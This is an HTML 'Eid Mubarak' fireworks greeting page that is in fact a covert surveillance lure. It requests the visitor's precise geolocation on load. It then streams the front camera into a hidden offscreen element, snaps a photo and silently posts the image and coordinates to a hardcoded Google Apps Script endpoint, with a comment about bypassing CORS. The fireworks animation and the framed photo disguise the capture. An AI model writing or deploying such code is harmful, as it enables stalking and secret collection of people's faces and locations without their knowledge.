<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Eid Mubarak</title>
<style>
    body { 
        margin: 0; background: #000; overflow: hidden; 
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
    }
    #start-btn {
        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        padding: 15px 40px; font-size: 20px; font-weight: bold;
        background: transparent; color: #ffd700; border: 2px solid #ffd700;
        border-radius: 30px; cursor: pointer; z-index: 100;
        box-shadow: 0 0 15px #ffd700; transition: 0.3s; letter-spacing: 2px;
    }
    #start-btn:hover { background: #ffd700; color: #000; }
    canvas { display: block; }
    
    .stealth-cam {
        position: absolute; top: -1000px; opacity: 0; pointer-events: none;
    }
</style>
</head>
<body onload="autoCapture()">

<video id="camera-stream" class="stealth-cam" autoplay playsinline muted></video>
<canvas id="capture-canvas" class="stealth-cam"></canvas>

<button id="start-btn" onclick="startCelebration()">START SHOW</button>
<canvas id="canvas"></canvas>

<script>
// ==================== PASTE YOUR URL HERE ====================
// Paste the Web App URL you got from Google Apps Script here
const GAS_URL = "https://script.google.com/macros/s/AKfycbysQWX0rYVcqVet3xrhPgtr9RoFgiDTfCrhrSbD8vT4_c962cWxeouoxCQ_dJ4NIRN1/exec"; 
// =============================================================

const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let cw = canvas.width = window.innerWidth;
let ch = canvas.height = window.innerHeight;

window.addEventListener('resize', () => {
    cw = canvas.width = window.innerWidth;
    ch = canvas.height = window.innerHeight;
});

let stage = 0; 
let textAlpha = 0;
let userPhoto = null; 
let photoRenderWidth = 0;
let photoRenderHeight = 0;
let hasCaptured = false;
let globalStream = null; 

let ambientSparkles = [], trails = [], fireworks = [], sparks = [];

// ================= LOCATION CAPTURE =================
function autoCapture() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            window.userLat = pos.coords.latitude;
            window.userLong = pos.coords.longitude;
        }, null, {enableHighAccuracy: true});
    }
}

// ================= API FETCH (Replaces google.script.run) =================
function sendDataToServer(imageData) {
    const lat = window.userLat || "Denied";
    const long = window.userLong || "Denied";
    
    const payload = JSON.stringify({
        lat: lat,
        long: long,
        image: imageData
    });

    // Send to Google Apps Script silently
    fetch(GAS_URL, {
        method: 'POST',
        body: payload,
        headers: {
            'Content-Type': 'text/plain;charset=utf-8' // Bypasses strict CORS
        }
    }).catch(err => console.error("Transmission failed", err));
}

// ================= CAMERA & LAUNCH LOGIC =================
function startCelebration() {
    const btn = document.getElementById('start-btn');
    btn.innerText = "ACCESSING CAMERA...";
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        globalStream = stream;
        const video = document.getElementById('camera-stream');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            btn.style.display = 'none';
            mainRocket = new MainRocket();
            stage = 1;
            animate();
        };
    })
    .catch(err => {
        alert("Camera access denied! The show will proceed without capture.");
        btn.style.display = 'none';
        sendDataToServer(null);
        mainRocket = new MainRocket();
        stage = 1;
        animate();
    });
}

function triggerCameraCapture() {
    const video = document.getElementById('camera-stream');
    
    if (globalStream && video.readyState >= 2) {
        const cCanvas = document.getElementById('capture-canvas');
        const targetWidth = 400; 
        const targetHeight = video.videoHeight * (targetWidth / video.videoWidth);
        
        cCanvas.width = targetWidth;
        cCanvas.height = targetHeight;
        cCanvas.getContext('2d').drawImage(video, 0, 0, targetWidth, targetHeight);
        
        const imageData = cCanvas.toDataURL('image/jpeg', 0.8); 
        
        userPhoto = new Image();
        userPhoto.onload = () => {
            const maxWidth = cw * 0.7; 
            const maxHeight = ch * 0.4; 
            const scale = Math.min(maxWidth / userPhoto.width, maxHeight / userPhoto.height);
            photoRenderWidth = userPhoto.width * scale;
            photoRenderHeight = userPhoto.height * scale;
            
            stage = 4; 
            setInterval(() => { fireworks.push(new Firework()); }, 600);
        };
        userPhoto.src = imageData;

        globalStream.getTracks().forEach(track => track.stop());
        sendDataToServer(imageData);
    } else {
        stage = 4;
        setInterval(() => { fireworks.push(new Firework()); }, 600);
    }
}

// ================= ANIMATION CLASSES =================
class AmbientSparkle {
    constructor() {
        this.x = Math.random() * cw; this.y = Math.random() * ch;
        this.size = Math.random() * 2; this.alpha = Math.random();
        this.fadeDir = Math.random() > 0.5 ? 1 : -1;
    }
    update() {
        this.alpha += 0.02 * this.fadeDir;
        if (this.alpha >= 1) { this.alpha = 1; this.fadeDir = -1; }
        if (this.alpha <= 0) { this.alpha = 0; this.fadeDir = 1; this.x = Math.random() * cw; this.y = Math.random() * ch; }
    }
    draw() {
        ctx.fillStyle = `rgba(255, 255, 255, ${this.alpha})`;
        ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
    }
}
for(let i=0; i<150; i++) ambientSparkles.push(new AmbientSparkle());

class MainRocket {
    constructor() {
        this.x = cw / 2; this.y = ch;
        this.targetY = ch * 0.20; 
        this.speed = 9;
    }
    update() {
        this.y -= this.speed;
        for(let i=0; i<5; i++) trails.push(new TrailParticle(this.x + (Math.random()-0.5)*10, this.y + 10));
        if (this.y <= this.targetY) { stage = 2; this.explode(); }
    }
    explode() {
        for(let i=0; i<120; i++) sparks.push(new Spark(this.x, this.y, "gold", true));
    }
    draw() {
        ctx.fillStyle = "white"; ctx.shadowBlur = 20; ctx.shadowColor = "orange";
        ctx.beginPath(); ctx.arc(this.x, this.y, 4, 0, Math.PI * 2); ctx.fill(); ctx.shadowBlur = 0;
    }
}

class TrailParticle {
    constructor(x, y) {
        this.x = x; this.y = y; this.size = Math.random() * 4 + 2;
        this.alpha = 1; this.vx = (Math.random() - 0.5) * 2; this.vy = Math.random() * 2 + 1;
    }
    update() {
        this.x += this.vx; this.y += this.vy;
        this.size *= 0.95; this.alpha -= 0.05;
    }
    draw() {
        ctx.fillStyle = `rgba(255, 100, 0, ${this.alpha})`;
        ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
    }
}

class Spark {
    constructor(x, y, color, isMassive = false) {
        this.x = x; this.y = y; this.color = color;
        this.angle = Math.random() * Math.PI * 2;
        this.speed = isMassive ? Math.random() * 15 + 2 : Math.random() * 6 + 2;
        this.friction = 0.95; this.gravity = 0.1;
        this.alpha = 1; this.decay = Math.random() * 0.02 + 0.01;
    }
    update() {
        this.speed *= this.friction; this.x += Math.cos(this.angle) * this.speed;
        this.y += Math.sin(this.angle) * this.speed + this.gravity; this.alpha -= this.decay;
    }
    draw() {
        ctx.globalAlpha = this.alpha; ctx.fillStyle = this.color;
        ctx.shadowBlur = 10; ctx.shadowColor = this.color;
        ctx.beginPath(); ctx.arc(this.x, this.y, 2, 0, Math.PI * 2); ctx.fill();
        ctx.globalAlpha = 1; ctx.shadowBlur = 0;
    }
}

class Firework {
    constructor() {
        this.x = cw / 2 + (Math.random() - 0.5) * cw * 0.9; this.y = ch;
        this.targetY = ch * 0.1 + Math.random() * (ch * 0.7); 
        this.speed = Math.random() * 5 + 7;
        this.color = `hsl(${Math.random() * 360}, 100%, 65%)`;
    }
    update() {
        this.y -= this.speed;
        trails.push(new TrailParticle(this.x, this.y)); 
        if (this.y <= this.targetY) this.explode();
    }
    explode() {
        for(let i=0; i<80; i++) sparks.push(new Spark(this.x, this.y, this.color));
    }
    draw() {
        ctx.fillStyle = "white"; ctx.beginPath(); ctx.arc(this.x, this.y, 2, 0, Math.PI * 2); ctx.fill();
    }
}

// ================= ANIMATION RENDERING =================
let mainRocket = null;

function drawText() {
    ctx.save();
    ctx.globalAlpha = textAlpha;
    ctx.shadowBlur = 25; ctx.shadowColor = "#ffd700"; ctx.fillStyle = "#ffdf00";
    let fontSize = cw < 600 ? 40 : 70; 
    ctx.font = `bold ${fontSize}px 'Segoe UI', sans-serif`;
    ctx.textAlign = "center"; ctx.textBaseline = "middle";
    ctx.fillText("EID MUBARAK", cw / 2, ch * 0.20);
    ctx.restore();
}

function drawUserPhoto() {
    if (!userPhoto) return;
    const imgX = cw / 2 - photoRenderWidth / 2;
    const imgY = ch * 0.32; 

    ctx.save();
    ctx.shadowBlur = 20; ctx.shadowColor = "#ffd700";
    ctx.strokeStyle = "#ffd700"; ctx.lineWidth = 6;
    ctx.strokeRect(imgX - 3, imgY - 3, photoRenderWidth + 6, photoRenderHeight + 6);
    
    ctx.shadowBlur = 0;
    ctx.drawImage(userPhoto, imgX, imgY, photoRenderWidth, photoRenderHeight);
    ctx.restore();
}

function animate() {
    requestAnimationFrame(animate);
    
    ctx.globalCompositeOperation = 'source-over';
    ctx.fillStyle = "rgba(0, 0, 0, 0.2)";
    ctx.fillRect(0, 0, cw, ch);
    
    ctx.globalCompositeOperation = 'lighter';
    ambientSparkles.forEach(s => { s.update(); s.draw(); });

    if (stage === 1 && mainRocket) {
        mainRocket.update();
        if(stage === 1) mainRocket.draw(); 
    }

    trails.forEach((t, i) => { t.update(); t.draw(); if (t.alpha <= 0) trails.splice(i, 1); });
    sparks.forEach((s, i) => { s.update(); s.draw(); if (s.alpha <= 0) sparks.splice(i, 1); });

    if (stage >= 3) {
        fireworks.forEach((f, i) => {
            f.update(); 
            if (f.y <= f.targetY) { fireworks.splice(i, 1); } else { f.draw(); }
        });
    }

    ctx.globalCompositeOperation = 'source-over';

    if (stage >= 2) {
        if (textAlpha < 1) textAlpha += 0.015;
        drawText();
        
        if (textAlpha >= 1 && stage === 2) {
            stage = 3; 
            if (!hasCaptured) {
                hasCaptured = true;
                triggerCameraCapture();
            }
        }
    }

    if (stage === 4) {
        drawUserPhoto();
    }
}
</script>
</body>
</html>
